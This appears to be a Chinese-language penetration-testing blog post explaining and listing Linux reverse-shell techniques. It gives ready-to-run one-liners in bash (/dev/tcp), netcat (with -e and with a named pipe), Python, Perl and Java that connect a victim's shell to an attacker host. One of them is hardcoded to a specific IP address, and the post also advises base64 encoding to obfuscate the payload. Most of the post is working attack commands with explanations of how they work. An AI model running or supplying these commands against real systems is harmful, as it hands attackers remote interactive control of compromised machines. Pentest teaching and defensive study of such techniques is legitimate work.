---
title: Linux反弹shell的各种方法
date: 2018-03-25 16:00:36
tags:
- pentest
- reverse shell
categories:
- pentest
---

## 0x00 bash版本

当bash在编译时指定了`--enable-net-redirections`参数，bash就可以通过读写字符设备`/dev/tcp`和`/dev/udp`很方便的实现tcp或udp重定向。这个特性是在2.04版中加入的，对于目前的新版bash，这个选项已经是默认编译选项。我们可以使用bash的这个特性，方便的反弹shell。

首先我们来检查一下受控主机的bash版本：

```bash
$ bash --version
GNU bash, version 4.4.18(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later http://gnu.org/licenses/gpl.html

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```

我们的受控主机是ubuntu 16.04操作系统，可以看到bash的版本非常新，远高于2.04。我们可以在控制端，监听某个端口`xxxx`，然后执行下面的命令：

```bash
$ bash -i >& /dev/tcp/attackerip/xxxx 0>&1
```

如果一切顺利，控制端应该就能收到回连的shell了。

下面简单解释一下这条命令。`-i`选项表示启动一个交互式bash。`>&`需要稍微介绍一下，因为它有三种看起来很相似，实际含义差别比较大，容易混淆的写法。

```bash
# 用法一：>&后面跟数字，代表将标准输入复制到数字代表的文件描述符
cmd >&3
# 用法二：关闭标准输出
cmd >&-
# 用法三：实际上是`cmd > file 2>&1`的简写，把标准输出和标准错误重定向到文件
cmd >& file
```

不难理解，上面的命令通过`>&`把标准输入和标准错误都重定向到了字符设备`/dev/tcp/attackerip/xxxx`中，最后`0>&1`把标准输入重定向到标准输出，也就是重定向到这个字符设备中。这个字符设备在文件系统中是不存在的，只是一个bash网络重定向特性支持的伪设备。bash会与ip地址为`attackerip`，端口`xxxx`建立连接，读这个设备就是通过连接接收数据，写这个设备就是向连接发送数据。

所以，最终我们实现了如下所示的通信过程：

```
attackerip:xxxx -->-->--> send cmd -->-->--> victim:bash	# fd 0
	|					|
	<--<--<--<--<--<-- recv result <--<--<--<		# fd 1&2
```

## 0x02 nc版本

nc有一个强大的`-e`选项，可以直接实现上一节bash命令实现的效果：

```bash
$ nc -e /bin/bash attackerip xxxx
```

但是，由于这个选项太危险了，所以很多Linux发行版默认提供的nc都会阉割掉这个选项。不过，借助强大的命名管道，我们完全可以实现“-e”选项的功能。

```bash
$ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc attackerip xxxx > /tmp/f
```

nc其实主要替代了上一节`/dev/tcp`的作用，我们要做的就是将bash和nc这两个没有亲缘关系的进程连接起来。很自然的我们可以使用命名管道。使用cat命令从命名管道`/tmp/f`读取用户输入发送给bash。而bash执行命令后的返回结果，会通过nc发送给攻击者。同时nc会从标准输入读取攻击者键入的命令，发送给命名管道`/tmp/f`。如下所示：

```
attackerip:xxxx -->-->--> send cmd -->-->--> victim:"/tmp/f" -->-->--> victim:bash
	|								|
	<--<--<--<--<--<--<--<--< recv result <--<--<--<--<--<--<--<--<--
```

## 0x03 各语言版本

### Python

Python版本的原理和上两节是一样的，只是更细节的从代码层面展示了反弹shell的原理。我们来简单的看一下，Python版本的代码：

```python
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("47.52.229.209", 2333)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'
```

首先在父进程中通过套接子建立连接，然后使用dup2系统调用将标准输入，标准输出和标准错误重定向到套接子指向的连接。最后使用`subprocess.call()`，创建bash子进程。Linux的进程描述符会在创建进程时直接拷贝，所以bash子进程的标准输入输出和标准错误，都已经重定向到我们建立的连接中。

此外，借鉴metasploit生成的Python后门，我们还可以使用`bases64`编码，起到混淆的作用。只要将上面的代码，用base64编码，然后用下面的方式调用即可：

```python
import base64; exec(base64.b64decode(PAYLOAD))
```

### Perl

Perl版本的思路和Python版几乎完全一致，只是写法不一样，如下所示：

```perl
perl -e 'use Socket;$i="attackerip";$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### Java

java版的本质也是通过第一节介绍的，bash的网络重定向实现的，如下所示：

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/attackerip/xxxx; cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
